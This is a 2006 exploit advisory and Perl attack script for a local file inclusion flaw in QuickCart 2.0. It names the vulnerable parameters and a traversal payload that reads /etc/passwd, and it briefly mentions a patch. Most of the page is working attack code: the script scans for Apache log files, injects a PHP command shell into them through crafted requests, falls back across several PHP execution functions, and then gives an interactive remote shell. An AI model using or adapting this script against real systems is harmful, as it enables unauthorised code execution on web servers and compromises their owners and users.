<html><head><title>QuickCart 2.0 (categories.php) Local File Inclusion Exploit</title></head><pre>#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                        QuickCart 2.0 Local File Inclusion Exploit                             #
#################################################################################################
# Software: QuickCart 2.0                                                                       #
#                                                                                               #
# Vendor: http://opensolution.org/                                                              #
#                                                                                               #
# Released: 2006/12/03                                                                          #
#                                                                                               #
# Critical: Moderately crtical                                                                  #
#                                                                                               #
# Discovered &amp; Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note: The information provided in this document is for Quick Cart administrator               #
# testing purposes only!                                                                        #
#                                                                                               #
# register_globals must be on                                                                   #
# gpc_magic_quotes must be off                                                                  #
#                                                                                               #
# actions_admin/categories.php?config[db_type]=                                                 #
# actions_admin/couriers.php?config[db_type]=                                                   #
# actions_admin/orders.php?config[db_type]=                                                     #
# actions_admin/products.php?config[db_type]=                                                   #
# actions_client/products.php?config[db_type]=                                                  #
# actions_client/orders.php?config[db_type]=                                                    #
#                                                                                               #
# Vulnerable code:                                                                              #
# require_once DIR_CORE.'couriers-'.$config['db_type'].'.php';                                  #
#                                                                                               #
# Patch: (Place this code at the top of every file)                                             #
# if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                                      #
#    die();                                                                                     #
#                                                                                               #
# Exploit: categories.php?config[db_type]=../../../../../../../../../../../etc/passwd%00        #
# Usage: perl localfilexpl.pl 127.0.0.1  actions_admin/categories.php?config[db_type]=          #
#################################################################################################

############################################################################
#                   Local File Inclusion Exploiter                         #
#                                                                          #
# This script attempts to exploit a local file include vulnerability       #
# by finding a readable http log file, then by sending a specially crafted #
# http request to the server in order to insert a PHP Shell into the       #
# log files. A shell is then spawned.                                      #
#                                                                          #
# Created By r0ut3r (writ3r [at] gmail.com)                                #
############################################################################

use IO::Socket;
use Switch;

$port = &quot;80&quot;; # connection port
$target = @ARGV[0]; # localhost
$vulnf = @ARGV[1]; # /include/WBmap.php?l=
$opt = @ARGV[2]; # -p (not needed)

sub Header()
{
        print q {Local File Inclusion Exploiter - By r0ut3r (writ3r [at]
gmail.com)
-------------------------------------------------------------------
};
}

sub Usage()
{
        print q {Usage: localfilexpl.pl [target] [folder &amp; vulnerable file]
[opt]
Example: localfilexpl.pl localhost /include/WBmap.php?l= -p
opt = -p (To print recieved content)
};
        exit();
}

Header();

if (!$target || !$vulnf) {
        Usage(); }

@targets = (
&quot;var/log/httpd/access_log&quot;,
&quot;var/log/httpd/error_log&quot;,
&quot;var/log/access_log&quot;,
&quot;var/log/error_log&quot;,
&quot;var/www/logs/access.log&quot;,
&quot;var/www/logs/access_log&quot;,
&quot;var/www/logs/error_log&quot;,
&quot;var/www/logs/error.log&quot;,
&quot;apache/logs/access_log&quot;,
&quot;apache/logs/error.log&quot;,
&quot;etc/httpd/logs/access.log&quot;,
&quot;etc/httpd/logs/access_log&quot;,
&quot;etc/httpd/logs/error.log&quot;,
&quot;etc/httpd/logs/error_log&quot;,
&quot;usr/local/apache/logs/access.log&quot;,
&quot;usr/local/apache/logs/access_log&quot;,
&quot;usr/local/apache/logs/error.log&quot;,
&quot;usr/local/apache/logs/error_log&quot;,
&quot;var/log/apache2/error_log&quot;,
&quot;var/log/apache2/error.log&quot;,
&quot;var/log/apache2/access_log&quot;,
&quot;var/log/apache2/access.log&quot;,
&quot;access_log&quot;,
);

@paths = ();
$dirs = 5;
$count = 0;

foreach $target (@targets)
{
        for(0..$dirs){
                $paths[$count+$_] = &quot;../&quot;x$_ . $target;
        }
        $count += $dirs;
}

print &quot;[+] Attempting to locate log file\n&quot;;
$log = &quot;&quot;;
foreach $path (@paths)
{
#print &quot;$path\n&quot;;
        $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target,
PeerPort =&gt; $port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
        print $sock &quot;GET &quot;.$vulnf.$path.&quot;%00 HTTP/1.1\n&quot;;
        print $sock &quot;Host: $target\n&quot;;
        print $sock &quot;User-Agent: Googlebot/2.1
(+http://www.google.com/bot.html)\n&quot;;
        print $sock &quot;Accept: text/html\n&quot;;
        print $sock &quot;Connection: close\n\n\r\n&quot;;

        while (&lt;$sock&gt;)
        {
                if (/&lt;title&gt;404 Not Found/)
                {
                        print &quot;[-] Vulnerable file not found! Exiting... \n&quot;;
                        exit();
                }

                if (/Permission denied/) {
                        print &quot;[-] Log file found, but permission was denied
to read file. [&quot;.$path.&quot;] \n&quot;; }

                if (/(.*?).(.*?).(.*?).(.*?) - - \[(.*?)/)
                {
                        if ($path ne $log) {
                                print &quot;[+] Log file found! [&quot;.$path.&quot;] \n&quot;; }
                        $log = $path;
                }
        }
}

if ($log eq &quot;&quot;) {
print &quot;[-] Log file not found. Exiting...\n&quot;; exit(); }

$cmdfunct = &quot;system&quot;;
print &quot;[+] Inserting PHP Shell into logs\n&quot;;
$code = &quot;&lt;?php ob_clean(); echo 'r0ut3r - Local File Include Expoiter '; echo
&quot;.$cmdfunct.&quot;(\$_GET['cmd']); die(); ?&gt;&quot;;
$xpl = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt;
$port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
print $xpl &quot;GET /&quot;.$code.&quot; HTTP/1.1\n&quot;;
print $xpl &quot;Host: $target\n&quot;;
print $xpl &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
print $xpl &quot;Accept: text/html\n&quot;;
print $xpl &quot;Connection: close\n\n\r\n&quot;;

@cmdfunctions = (&quot;exec&quot;, &quot;shell_exec&quot;, &quot;passthru&quot;);
$enabled_funct = false;

$xpl_test = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target,
PeerPort =&gt; $port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
print $xpl_test &quot;GET &quot;.$vulnf.$path.$log.&quot;%00&amp;cmd=dir HTTP/1.1\n&quot;;
print $xpl_test &quot;Host: $target\n&quot;;
print $xpl_test &quot;User-Agent: Googlebot/2.1
(+http://www.google.com/bot.html)\n&quot;;
print $xpl_test &quot;Accept: text/html\n&quot;;
print $xpl_test &quot;Connection: close\n\n\r\n&quot;;

while (&lt;$xpl_test&gt;)
{
        if (/system\(\) has been disabled for security/)
        {
                print &quot;[-] system() function is disabled. \n&quot;;
                foreach $cmdfunct (@cmdfunctions)
                {
                        if ($enabled_funct eq false)
                        {
                                print &quot;[+] Trying &quot;.$cmdfunct.&quot;()\n&quot;;
                                $code = &quot;&lt;?php ob_clean(); echo 'r0ut3r - Local File Include Expoiter '; echo &quot;.$cmdfunct.&quot;(\$_GET['cmd']); die(); ?&gt;&quot;;
                                $xpl = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect.
Exiting...\r\n&quot;;
                                print $xpl &quot;GET /&quot;.$code.&quot; HTTP/1.1\n&quot;;
                                print $xpl &quot;Host: $target\n&quot;;
                                print $xpl &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
                                print $xpl &quot;Accept: text/html\n&quot;;
                                print $xpl &quot;Connection: close\n\n\r\n&quot;;

                                $xpl_retry = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect.
Exiting...\r\n&quot;;
                                print $xpl_retry &quot;GET &quot;.$vulnf.$path.$log.&quot;%00&amp;cmd=dir HTTP/1.1\n&quot;;
                                print $xpl_retry &quot;Host: $target\n&quot;;
                                print $xpl_retry &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
                                print $xpl_retry &quot;Accept: text/html\n&quot;;
                                print $xpl_retry &quot;Connection: close\n\n\r\n&quot;;

                                while (&lt;$xpl_retry&gt;)
                                {
                                        if (/b&gt;:  $cmdfunct\(\) has been disabled for security reasons/)
                                        {
                                                print &quot;[-] &quot;.$cmdfunct.&quot;() function is disabled. \n&quot;;
                                                $enabled_funct = false;
                                                last;
                                        }
                                        else
                                        {
                                                $enabled_funct = true;
                                        }
                                }

                                if ($enabled_funct eq true)
                                {
                                        print &quot;[+] Enabled function found! [&quot;.$cmdfunct.&quot;]\n&quot;;
                                        break;
                                }
                        }
                }

                if ($enabled_funct eq false) {
                print &quot;[-] No enabled cmd function found. Tried system(),
exec(), shell_exec(), passthru()\n&quot;; exit(); }
        }
}

print &quot;[!] Command execution at: http://&quot;.$target.$vulnf.$log.&quot;%00\n&quot;;
print &quot;[+] Creating shell - Type 'exit' to quit\n&quot;;

print &quot;[cmd]\$ &quot;;
$cmd = &lt;STDIN&gt;;
$cmd =~ s/ /%20/g;

while ($cmd !~ &quot;exit&quot;)
{
        $scmd = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target,
PeerPort =&gt; $port) || die &quot;[-] Failed to connect. Exiting...\r\n&quot;;
        print $scmd &quot;GET &quot;.$vulnf.$path.$log.&quot;%00&amp;cmd=&quot;.substr($cmd, 0, -1).&quot;
HTTP/1.1\n&quot;;
        print $scmd &quot;Host: $target\n&quot;;
        print $scmd &quot;User-Agent: Googlebot/2.1
(+http://www.google.com/bot.html)\n&quot;;
        print $scmd &quot;Accept: text/html\n&quot;;
        print $scmd &quot;Connection: close\n\n\r\n&quot;;

        # prints output from command execution
        if ($opt eq &quot;-p&quot;)
        {
                while (&lt;$scmd&gt;)
                {
                        print &lt;$scmd&gt;;
                }
        }

        print &quot;[cmd]\$ &quot;;
        $cmd = &lt;STDIN&gt;;
        $cmd =~ s/ /%20/g;
}

# milw0rm.com [2006-12-03]</pre></html>